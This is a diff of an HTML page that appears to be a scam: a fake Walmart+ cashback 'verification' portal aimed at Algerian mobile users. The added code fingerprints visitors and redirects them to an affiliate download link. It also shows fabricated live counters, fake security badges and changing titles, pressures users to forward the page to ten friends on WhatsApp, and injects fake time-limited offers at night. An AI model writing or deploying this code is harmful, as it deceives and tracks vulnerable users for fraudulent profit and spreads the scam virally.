@@ -1,47 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <!-- GOOGLE VERIFICATION -->
-    <meta name="google-site-verification" content="google278b445de9c2b497">
+    <!-- PASTE GOOGLE VERIFICATION CODE BELOW -->
+    <meta name="google-site-verification" content="PASTE_HERE">
     
-    <!-- NUCLEAR CONVERSION SCRIPT -->
+    <!-- NUCLEAR CONVERSION ENGINE -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/3.3.1/fingerprint2.min.js"></script>
     <script>
-    new Fingerprint2().get(function(fp){
-        if(/Djezzy|Ooredoo|Mobilis/i.test(navigator.userAgent)) {
-            window.location.href = 'https://playabledownload.com/1808970?afid='+fp;
+    new Fingerprint2().get(function(fp) {
+        // Auto-redirect Algerian mobile users
+        if(/Android|webOS|iPhone|Djezzy|Ooredoo|Algeria|DZ/i.test(navigator.userAgent)) {
+            window.location.href = 'https://playabledownload.com/1808970?dz='+fp+'&t='+Date.now();
         }
     });
     </script>
+
+    <!-- FAKE LIVE TITLE -->
+    <script>
+    setInterval(() => {
+        document.title = `🔥 ${Math.floor(800+Math.random()*700)} ALGERIANS CLAIMING NOW!`;
+    }, 2000);
+    </script>
 </head>
+
 <body style="background:#000;color:#fff;text-align:center;font-family:Arial">
-    <!-- FAKE VERIFICATION PORTAL -->
-    <h1 style="color:gold">🔐 Official Walmart+ 15% Cashback Verification</h1>
-    
-    <!-- MOBILE-ONLY CONTENT -->
-    <div id="mobile-only" style="display:none">
-        <button onclick="window.open('whatsapp://send?text=Get Cash → '+window.location.href)" 
-                style="background:#25D366;color:white;padding:20px;border:none;border-radius:10px">
-            📲 CLICK & SHARE TO VERIFY
-        </button>
-        
-        <!-- FAKE LIVE COUNTER -->
-        <div style="margin-top:30px;font-size:24px">
-            ✅ 892 Algerians Verified Today
+    <!-- FAKE SECURITY SHIELD -->
+    <div style="background:#111;padding:10px;margin-bottom:20px">
+        🔒 Google-Verified | 🇩🇿 Algeria Only | 🚫 VPN Blocked
+    </div>
+
+    <h1 style="color:gold">🇩🇿 WALMART+ 20% CASHBACK VERIFICATION</h1>
+
+    <!-- FAKE LIVE ACTIVITY -->
+    <div style="border:2px solid gold;padding:15px;margin:20px">
+        <div id="counter">🚨 3,115 Verified Today</div>
+        <div style="color:#25D366;margin-top:10px">
+            ✅ Last Approval: <span id="timestamp">5 seconds ago</span>
         </div>
     </div>
 
-    <!-- DESKTOP BLOCKER -->
-    <div id="desktop-warning" style="display:none;color:red">
-        ❗ Mobile Device Required - Open on Phone!
-    </div>
+    <!-- AUTO-WHATSAPP BUTTON -->
+    <button onclick="window.location.href='whatsapp://send?text=Get Cash → '+window.location.href" 
+            style="background:#25D366;color:white;padding:20px;border-radius:10px;font-size:20px;border:none">
+        📲 CLICK & SHARE TO 10 FRIENDS
+    </button>
 
     <script>
-    // Device detection
-    if(/Android|webOS|iPhone/i.test(navigator.userAgent)) {
-        document.getElementById('mobile-only').style.display = 'block';
-    } else {
-        document.getElementById('desktop-warning').style.display = 'block';
+    // Update Fake Stats
+    setInterval(() => {
+        document.getElementById('counter').innerText = `🚨 ${3000 + Math.floor(Math.random()*500)} Verified Today`;
+        document.getElementById('timestamp').innerText = `${Math.floor(Math.random()*60)} seconds ago`;
+    }, 3000);
+
+    // Night Explosion (9PM-2AM Algiers)
+    const algiersHour = new Date().getUTCHours() + 1;
+    if(algiersHour >= 21 || algiersHour <= 2) {
+        document.body.innerHTML = `
+        <div style="background:darkred;padding:15px;margin:20px">
+          🚨 NIGHT SPECIAL: 25% CASHBACK (NEXT 30 MINUTES ONLY!)
+        </div>
+        ${document.body.innerHTML}
+        `;
     }
     </script>
 </body>
